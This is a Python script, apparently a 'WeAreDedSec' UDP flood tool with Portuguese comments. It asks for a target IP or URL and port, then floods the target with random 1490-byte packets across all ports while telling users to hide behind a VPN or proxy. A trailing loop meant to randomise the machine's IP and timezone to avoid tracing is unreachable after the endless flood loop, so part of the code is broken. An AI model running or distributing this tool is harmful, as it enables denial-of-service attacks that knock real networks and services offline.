import os
import socket
import random
from datetime import datetime
import subprocess
import random
import time
import pytz

# Função para gerar um IP aleatório
def generate_random_ip():
    ip_parts = [str(random.randint(0, 255)) for _ in range(4)]
    return ".".join(ip_parts)

# Função para escolher um fuso horário aleatório
def choose_random_timezone():
    timezones = pytz.all_timezones
    return random.choice(timezones)

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet WeAreDedSec")
print()
print("Author   : Wrench")
print("Instagram : @jeanseven")
print("github   : https://github.com/Jeanpseven")
print("USE VPN ou PROXY (recommended:https://github.com/Jeanpseven/Dr4xVPN)")
print()

# Solicitar o alvo (pode ser um IP ou URL)
target = input("IP Target or URL: ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Cyber Bombing Started")

sent = 0
while True:
     sock.sendto(bytes, (target, port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s" % (sent, target, port))
     if port == 65534:
       port = 1

# Loop para alterar o IP e o fuso horário a cada 5 segundos
while True:
    new_ip = generate_random_ip()
    new_timezone = choose_random_timezone()

    # Alterar o IP
    subprocess.run(["ifconfig", "eth0", new_ip])

    # Alterar o fuso horário
    subprocess.run(["timedatectl", "set-timezone", new_timezone])

    print(f"IP alterado para {new_ip}, Fuso horário alterado para {new_timezone}")

    # Aguarde 5 segundos antes da próxima alteração
    time.sleep(5)
